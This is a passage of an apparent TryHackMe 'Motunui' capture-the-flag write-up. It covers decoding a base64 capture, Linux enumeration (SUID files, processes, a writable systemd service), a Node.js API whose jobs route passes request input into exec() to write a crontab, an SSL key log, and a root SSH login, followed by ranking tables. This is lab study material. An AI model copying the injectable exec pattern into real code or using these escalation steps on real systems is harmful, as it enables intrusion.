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' > file
```

```bash
:~/Motunui# file file
file: ASCII text, with very long lines
:~/Motunui# cat file | base64 -d > network.pkt
:~/Motunui# file network.pkt
network.pkt: data
```

```bash
moana@motunui:~$ cat user.txt
THM{*****_**_*******}
```

<br>
<p>1.1. What is the user flag?<br>
<code>THM{*****_**_*******}</code></p>
<br>

```bash
moana@motunui:~$ getent hosts
127.0.0.1       localhost
127.0.1.1       motunui dev.motunui.thm api.motunui.thm
127.0.0.1       ip6-localhost ip6-loopback
```

```bash
moana@motunui:~$ netstat -tunlp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:8000            0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::5000                 :::*                    LISTEN      -                   
tcp6       0      0 :::139                  :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::3000                 :::*                    LISTEN      -                   
tcp6       0      0 :::445                  :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 xx.xxx.xxx.x:68         0.0.0.0:*                           -                   
udp        0      0 10.201.127.255:137      0.0.0.0:*                           -                   
udp        0      0 xx.xxx.xxx.x:137        0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:137             0.0.0.0:*                           -                   
udp        0      0 10.201.127.255:138      0.0.0.0:*                           -                   
udp        0      0 xx.xxx.xxx.x:138        0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:138             0.0.0.0:*                           -    
```

```bash
moana@motunui:~$ find / -perm -4000 -type f -ls 2>/dev/null
   411110    112 -rwsr-xr-x   1 root     root       113528 Jul 10  2020 /usr/lib/snapd/snap-confine
   394289     12 -rwsr-xr-x   1 root     root        10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
   394323     44 -rwsr-xr--   1 root     messagebus    42992 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
   394475     16 -rwsr-xr-x   1 root     root          14328 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
   524942    100 -rwsr-xr-x   1 root     root         100760 Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
   394471    428 -rwsr-xr-x   1 root     root         436552 Mar  4  2019 /usr/lib/openssh/ssh-keysign
   393918     40 -rwsr-xr-x   1 root     root          37136 Mar 22  2019 /usr/bin/newgidmap
   393716     44 -rwsr-xr-x   1 root     root          44528 Mar 22  2019 /usr/bin/chsh
   393920     40 -rwsr-xr-x   1 root     root          37136 Mar 22  2019 /usr/bin/newuidmap
   393663     52 -rwsr-sr-x   1 daemon   daemon        51464 Feb 20  2018 /usr/bin/at
   393919     40 -rwsr-xr-x   1 root     root          40344 Mar 22  2019 /usr/bin/newgrp
   394097     20 -rwsr-xr-x   1 root     root          18448 Jun 28  2019 /usr/bin/traceroute6.iputils
   393714     76 -rwsr-xr-x   1 root     root          76496 Mar 22  2019 /usr/bin/chfn
   393809     76 -rwsr-xr-x   1 root     root          75824 Mar 22  2019 /usr/bin/gpasswd
   393956     24 -rwsr-xr-x   1 root     root          22520 Mar 27  2019 /usr/bin/pkexec
   394061    148 -rwsr-xr-x   1 root     root         149080 Jan 31  2020 /usr/bin/sudo
   393936     60 -rwsr-xr-x   1 root     root          59640 Mar 22  2019 /usr/bin/passwd
       66     40 -rwsr-xr-x   1 root     root          40152 Jan 27  2020 /snap/core/9804/bin/mount
       80     44 -rwsr-xr-x   1 root     root          44168 May  7  2014 /snap/core/9804/bin/ping
       81     44 -rwsr-xr-x   1 root     root          44680 May  7  2014 /snap/core/9804/bin/ping6
       98     40 -rwsr-xr-x   1 root     root          40128 Mar 25  2019 /snap/core/9804/bin/su
      116     27 -rwsr-xr-x   1 root     root          27608 Jan 27  2020 /snap/core/9804/bin/umount
     2607     71 -rwsr-xr-x   1 root     root          71824 Mar 25  2019 /snap/core/9804/usr/bin/chfn
     2609     40 -rwsr-xr-x   1 root     root          40432 Mar 25  2019 /snap/core/9804/usr/bin/chsh
     2685     74 -rwsr-xr-x   1 root     root          75304 Mar 25  2019 /snap/core/9804/usr/bin/gpasswd
     2777     39 -rwsr-xr-x   1 root     root          39904 Mar 25  2019 /snap/core/9804/usr/bin/newgrp
     2790     53 -rwsr-xr-x   1 root     root          54256 Mar 25  2019 /snap/core/9804/usr/bin/passwd
     2900    134 -rwsr-xr-x   1 root     root         136808 Jan 31  2020 /snap/core/9804/usr/bin/sudo
     2999     42 -rwsr-xr--   1 root     systemd-resolve    42992 Jun 11  2020 /snap/core/9804/usr/lib/dbus-1.0/dbus-daemon-launch-helper
     3369    419 -rwsr-xr-x   1 root     root              428240 May 26  2020 /snap/core/9804/usr/lib/openssh/ssh-keysign
     6423    109 -rwsr-xr-x   1 root     root              110792 Jul 29  2020 /snap/core/9804/usr/lib/snapd/snap-confine
     7600    386 -rwsr-xr--   1 root     dip               394984 Feb 11  2020 /snap/core/9804/usr/sbin/pppd
       66     40 -rwsr-xr-x   1 root     root               40152 Jan 27  2020 /snap/core/9665/bin/mount
       80     44 -rwsr-xr-x   1 root     root               44168 May  7  2014 /snap/core/9665/bin/ping
       81     44 -rwsr-xr-x   1 root     root               44680 May  7  2014 /snap/core/9665/bin/ping6
       98     40 -rwsr-xr-x   1 root     root               40128 Mar 25  2019 /snap/core/9665/bin/su
      116     27 -rwsr-xr-x   1 root     root               27608 Jan 27  2020 /snap/core/9665/bin/umount
     2605     71 -rwsr-xr-x   1 root     root               71824 Mar 25  2019 /snap/core/9665/usr/bin/chfn
     2607     40 -rwsr-xr-x   1 root     root               40432 Mar 25  2019 /snap/core/9665/usr/bin/chsh
     2683     74 -rwsr-xr-x   1 root     root               75304 Mar 25  2019 /snap/core/9665/usr/bin/gpasswd
     2775     39 -rwsr-xr-x   1 root     root               39904 Mar 25  2019 /snap/core/9665/usr/bin/newgrp
     2788     53 -rwsr-xr-x   1 root     root               54256 Mar 25  2019 /snap/core/9665/usr/bin/passwd
     2898    134 -rwsr-xr-x   1 root     root              136808 Jan 31  2020 /snap/core/9665/usr/bin/sudo
     2997     42 -rwsr-xr--   1 root     systemd-resolve    42992 Jun 11  2020 /snap/core/9665/usr/lib/dbus-1.0/dbus-daemon-launch-helper
     3367    419 -rwsr-xr-x   1 root     root              428240 May 26  2020 /snap/core/9665/usr/lib/openssh/ssh-keysign
     6405    109 -rwsr-xr-x   1 root     root              110656 Jul 10  2020 /snap/core/9665/usr/lib/snapd/snap-confine
     7582    386 -rwsr-xr--   1 root     dip               394984 Feb 11  2020 /snap/core/9665/usr/sbin/pppd
   786500     32 -rwsr-xr-x   1 root     root               30800 Aug 11  2016 /bin/fusermount
   787615     44 -rwsr-xr-x   1 root     root               43088 Mar  5  2020 /bin/mount
   787633     28 -rwsr-xr-x   1 root     root               26696 Mar  5  2020 /bin/umount
   786567     44 -rwsr-xr-x   1 root     root               44664 Mar 22  2019 /bin/su
   786551     64 -rwsr-xr-x   1 root     root               64424 Jun 28  2019 /bin/ping
```

```bash
moana@motunui:~$ ps aux | grep root
...
root      1025  0.0  0.1 110416  1696 ?        Ssl  21:31   0:00 /usr/sbin/irqbalance --foreground
root      1028  0.0  0.5 286348  5472 ?        Ssl  21:31   0:00 /usr/lib/accountsservice/accounts-daemon
root      1030  0.0  0.6  70612  5928 ?        Ss   21:31   0:00 /lib/systemd/systemd-logind
root      1033  0.0  0.3  30028  3024 ?        Ss   21:31   0:00 /usr/sbin/cron -f
root      1035  0.0  0.7 264060  7364 ?        Ss   21:31   0:00 /usr/sbin/nmbd --foreground --no-process-group
root      1037  0.0  1.5 169144 15592 ?        Ssl  21:31   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
root      1043  0.1  0.2 604972  2012 ?        Ssl  21:31   0:12 /usr/bin/lxcfs /var/lib/lxcfs/
root      1151  0.9  7.6 964940 75224 ?        Ssl  21:31   1:24 /usr/bin/node /var/www/tls-html/server.js
root      1153  0.0  2.6 784404 26000 ?        Ssl  21:31   0:01 /usr/lib/snapd/snapd
root      1174  0.0  1.8 185948 17804 ?        Ssl  21:31   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
root      1182  0.0  0.2  14664  2060 ttyS0    Ss+  21:31   0:00 /sbin/agetty -o -p -- \u --keep-baud 115200,38400,9600 ttyS0 vt220
root      1186  0.0  0.1  14888  1644 tty1     Ss+  21:31   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
root      1187  0.0  0.5 291396  5132 ?        Ssl  21:31   0:03 /usr/lib/policykit-1/polkitd --no-debug
root      1261  0.0  0.5  72300  5304 ?        Ss   21:31   0:00 /usr/sbin/sshd -D
root      1273  0.0  1.4 327148 14160 ?        Ss   21:31   0:00 /usr/sbin/apache2 -k start
root      1375  0.0  1.2 355408 12260 ?        Ss   21:31   0:01 /usr/sbin/smbd --foreground --no-process-group
root      1460  0.0  0.4 343656  4904 ?        S    21:31   0:00 /usr/sbin/smbd --foreground --no-process-group
root      1461  0.0  0.3 343680  3432 ?        S    21:31   0:00 /usr/sbin/smbd --foreground --no-process-group
root      1482  0.0  0.5 355392  5536 ?        S    21:31   0:00 /usr/sbin/smbd --foreground --no-process-group
root      2181  0.0  0.0      0     0 ?        I    21:55   0:00 [kworker/u4:1]
root      3011  0.0  0.0      0     0 ?        I    22:22   0:00 [kworker/0:2]
root      3372  0.0  0.0      0     0 ?        I    23:05   0:00 [kworker/u4:2]
root      3471  0.0  0.3  57504  3296 ?        S    23:10   0:00 /usr/sbin/CRON -f
root      3482  0.0  0.3  57504  3296 ?        S    23:11   0:00 /usr/sbin/CRON -f
root      3501  0.0  0.3  57504  3296 ?        S    23:12   0:00 /usr/sbin/CRON -f
root     25314  0.0  0.0      0     0 ?        I    23:37   0:00 [kworker/u4:0]
root     25417  0.0  0.0      0     0 ?        I    23:39   0:00 [kworker/1:2]
root     25547  0.0  0.7 105688  7184 ?        Ss   23:51   0:00 sshd: moana [priv]
root     25552  0.0  0.0      0     0 ?        I    23:51   0:00 [kworker/1:1]
root     25762  0.0  0.3  57504  3316 ?        S    23:55   0:00 /usr/sbin/CRON -f
root     25774  0.0  0.3  57504  3296 ?        S    23:56   0:00 /usr/sbin/CRON -f
moana    25784  0.0  0.1  13136  1004 pts/1    R+   23:56   0:00 grep --color=auto root
```

<img width="1347" height="674" alt="image" src="https://github.com/user-attachments/assets/5de29306-47fb-42e2-b485-493040155978" />

<br>
<br>
<br>

```bash
moana@motunui:~$ ls -la /etc/systemd/system/api.service
-rw-rw-r-- 1 root moana 204 Aug 20  2020 /etc/systemd/system/api.service
```

```bash
moana@motunui:~$ ls -la /etc/systemd/system/multi-user.target.wants/api.service
lrwxrwxrwx 1 root root 31 Jul  9  2020 /etc/systemd/system/multi-user.target.wants/api.service -> /etc/systemd/system/api.service
```


```bash
moana@motunui:~$ cat /etc/systemd/system/multi-user.target.wants/api.service
[Unit]
Description=The API for Motunui

[Service]
User=www-data
Group=www-data
ExecStart=/usr/bin/node /var/www/api.motunui.thm/server.js
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
```


```bash
moana@motunui:~$ ls -la /var/www/api.motunui.thm/server.js
-rw-r--r-- 1 www-data www-data 2330 Aug  3  2020 /var/www/api.motunui.thm/server.js
```

```bash
xx.xxx.xxx.x    d3v3lopm3nt.motunui.thm api.motunui.thm dev.motunui.thm
```


<p>server.js</p>

```bash
const connect = require('connect');
const http = require('http');
const vhost = require('vhost');
const bodyParser = require('body-parser');
const { exec } = require('child_process');

const app = connect();

app.use(bodyParser.json());

const login = (req, res) => {
	if (req.method !== 'POST') {
		res.writeHead(405);
		return res.end(JSON.stringify({ error: 'method not allowed' }));
	}

	const { username, password } = req.body;

	if (username === 'maui' && password === 'island') {
		res.writeHead(200);
		return res.end(JSON.stringify({ hash: '--------' }));
	}

	res.writeHead(401);
	return res.end(JSON.stringify({ error: 'invalid credentials'  }));
};

const old = (req, res) => {
	res.writeHead(200);
	return res.end(JSON.stringify({ message: 'please get maui to update these routes' }));
}

const jobs = (req, res) => {
	if (req.method === 'GET') {
		if (req.body.hash !== '--------') {
			res.writeHead(403);
			return res.end(JSON.stringify({ error: 'you are unauthorised to view this resource' }));
		}

		exec('cat /var/spool/cron/crontabs/www-data', (err, stdout, stderr) => {
			const cron = stdout.split('\n').filter(entry => !!entry && !entry.startsWith('#'));
			res.writeHead(200);
			return res.end(JSON.stringify({ 'jobs': cron }));
		});

	} else if (req.method === 'POST') {
		if (req.body.hash !== 'aXNsYW5k') {
			res.writeHead(403);
			return res.end(JSON.stringify({ error: 'you are unauthorised to view this reousce' }));
		}

		exec(`echo "${req.body.job}" > /var/spool/cron/crontabs/www-data`, (err, stdout, stderr) => {
			res.writeHead(201);
			return res.end(JSON.stringify({ 'job': req.body.job }));
		});
	} else {
		res.writeHead(405);
		return res.end(JSON.stringify({ error: 'method not allowed' }));
	}

};

const error = (req, res) => {
	res.writeHead(404);
	return res.end(JSON.stringify({ error: 'refer to the documentation for valid routes' }));
};

const server = http.createServer((req, res) => {
	res.setHeader('Content-Type', 'application/json');

	switch (req.url) {
		case '/v1/login': old(req, res); break;
		case '/v1/jobs': old(req, res); break;
		case '/v2/login': login(req, res); break;
		case '/v2/jobs': jobs(req, res); break;
		default: error(req, res);
	}
});

app.use(vhost('api.motunui.thm', (req, res) => {
	server.emit('request', req, res);
}));

app.listen(3000);
```

<p>/etc/ssl.txt</p>

```bash
moana@motunui:/var/www/api.motunui.thm$ env
...d=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:
SSH_CONNECTION=xx.xxx.xx.xxx48688 xx.xxx.xxx.x 22
LESSCLOSE=/usr/bin/lesspipe %s %s
LANG=en_US.UTF-8
XDG_SESSION_ID=288
USER=moana
PWD=/var/www/api.motunui.thm
HOME=/home/moana
SSH_CLIENT=xx.xxx.xx.xxx 48688 22
XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop
SSH_TTY=/dev/pts/1
MAIL=/var/mail/moana
TERM=xterm-256color
SHELL=/bin/bash
SHLVL=1
SSLKEYLOGFILE=/etc/ssl.txt
LOGNAME=moana
```




```bash
moana@motunui:/etc$ cat ssl.txt
CLIENT_RANDOM 432738e149bdfb67ce70ca989045c1f2f75...57f38e1ed457295 ee0b4...36f5246233ed71164a9a7e017d417afa
...
```






<img width="1275" height="716" alt="image" src="https://github.com/user-attachments/assets/20146398-5ba6-49b2-8431-03919299639f" />


```bash
:~/Motunui# ssh root@api.motunui.thm
root@api.motunui.thm's password: 
...
root@motunui:~# id
uid=0(root) gid=0(root) groups=0(root)
root@motunui:~# pwd
/root
root@motunui:~# ls
root.txt
root@motunui:~# cat root.txt
THM{*****_********}
```





<br>
<br>
<br>
<h1 align="center">Completed</h1>
<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/e42eeecd-d524-4d1a-8606-e99746adb603"><br>
                  <img width="1200px" src="https://github.com/user-attachments/assets/58a56910-5c9b-41da-82d6-fbe9e8cff05f"></p>

<h1 align="center">My TryHackMe Journey ・ 2025, October</h1>

<div align="center"><h6>

| Date   | Room                                  |Streak   |All Time<br>Global|All Time<br>Brazil|Monthly<br>Global|Monthly<br>Brazil|Points|Rooms<br>Completed|Badges|
|:------:|:--------------------------------------|--------:|------------:|------------:|------------:|------------:|------------:|------------:|------------:|
|8       |Hard 🚩 - Motunui                      | 520    |     103ʳᵈ    |      4ᵗʰ     |     383ʳᵈ    |     4ᵗʰ    | 129,201  |    994    |    76     |
|8       |Easy 🔗 - Man-in-the-Middle            | 520    |     103ʳᵈ    |      4ᵗʰ     |     390ᵗʰ    |     4ᵗʰ    | 129,141  |    993    |    76     |
|7       |Medium 🚩 - Profiles, in progress      | 519    |              |              |              |            | 129,021  |    992    |    76     |
|6       |Medium 🚩 - VulnNet                    | 518    |     105ᵗʰ    |      4ᵗʰ     |     348ᵗʰ    |     5ᵗʰ    | 129,021  |    992    |    76     |
|6       |Easy 🚩 - DearQA                       | 518    |     105ᵗʰ    |      4ᵗʰ     |     333ʳᵈ    |     6ᵗʰ    | 128,991  |    991    |    76     |
|5       |Medium 🚩 - Frank & Herby try again.....| 517   |     106ᵗʰ    |      4ᵗʰ     |     300ᵗʰ    |     5ᵗʰ    | 128,931  |    990    |    76     |
|4       |Medium 🚩 - Frank & Herby make an app  | 516    |     105ᵗʰ    |      4ᵗʰ     |     233ʳᵈ    |     3ʳᵈ    | 128,871  |    989    |    76     |
|4       |Info ℹ️ - OverlayFS - CVE-2021-3493    | 516    |     105ᵗʰ    |      4ᵗʰ     |     235ᵗʰ    |     3ʳᵈ    | 128,841  |    988    |    76     |
|3       |Medium 🚩 - XDR: Operation Global Dagger2| 515  |     104ᵗʰ    |      4ᵗʰ     |     149ᵗʰ    |     3ʳᵈ    | 128,833  |    987    |    76     |
|3       |Medium 🚩 - VulnNet: dotpy             | 515    |     108ᵗʰ    |      4ᵗʰ     |     741ˢᵗ    |    11ˢᵗ    | 128,563  |    986    |    76     |
|2       |Medium 🔗 - Data Exfiltration Detection| 514    |     108ᵗʰ    |      4ᵗʰ     |     521ˢᵗ    |     8ᵗʰ    | 128,503  |    985    |    76     |
|1       |Medium 🔗 - Network Discovery Detection| 513    |     108ᵗʰ    |      4ᵗʰ     |     875ᵗʰ    |     7ᵗʰ    | 128,407  |    984    |    76     |
|1       |Medium 🚩 - Intranet                   | 513    |     108ᵗʰ    |      4ᵗʰ     |    3,357ᵗʰ   |    57ᵗʰ    | 128,335  |    983    |    76     |

</h6></div>

<br>

<p align="center">Global All Time:   103ʳᵈ<br><img width="250px" src="https://github.com/user-attachments/assets/ba3524c5-795d-4d99-bee5-dc53a7027466"><br>
                                              <img width="1200px" src="https://github.com/user-attachments/assets/2b26da3e-0fc2-4064-b223-7cdbd3404dc9"><br><br>
                  Brazil All Time:     4ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/3630b239-31cc-43a7-b2f4-cd7949f85dcb"><br>
                  Global monthly:     383ʳᵈ<br><img width="1200px" src="https://github.com/user-attachments/assets/97d757bf-f8c7-49f6-82d6-717bdb91cf4e"><br>
                  Brazil monthly:       4ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/5a08efbd-7ddb-4f45-a91a-bc28f9af3c0f"><br>
